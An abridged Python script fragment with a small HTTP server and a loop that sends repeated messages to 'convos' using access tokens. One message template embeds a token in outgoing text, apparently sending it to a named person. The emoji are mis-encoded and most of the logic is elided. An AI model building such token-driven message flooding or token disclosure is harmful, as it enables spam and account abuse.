...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"LOL_ðŸ˜¹ðŸ˜¹ðŸ˜¹ðŸ˜¹ðŸ˜¹")
def execute_server():
...
def send_initial_message():
      ...
      msg_template = "HELLO SAHBAAN H R U. MY TOKEN SAHBAAN {}"
      ...
      def liness():
          print('\033[1;92m' + 'â€¢â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ FREE TO ALL â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â€¢')
      ...
      while True:
          try:
              for message_index in range(num_messages):
                  ...
                  current_time = time.strftime("\033[1;92m Accepted ==> %Y-%m-%d %I:%M:%S %p")
                  if response.ok:
                      print("\033[1;92m[+] Server Running {} of Convo {} Token {}: {}".format(
